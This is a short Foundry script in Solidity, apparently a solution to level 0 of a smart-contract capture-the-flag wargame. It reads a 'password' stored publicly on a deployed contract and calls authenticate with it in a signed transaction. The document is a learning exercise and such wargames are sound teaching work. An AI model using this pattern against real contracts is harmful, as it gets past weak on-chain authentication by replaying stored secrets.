// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../src/Level0.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Level0Attack is Script {
    Level0 public level0Instance = Level0(0x4f0f056068d7c159e0995C4Dc4CC6473460553db);

    function run() external {
        console.log("Level0Attack.run() called");
        // this is the way to call the real blockchain method
        string memory password = level0Instance.password();
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        level0Instance.authenticate(password);
        vm.stopBroadcast();
    }
}
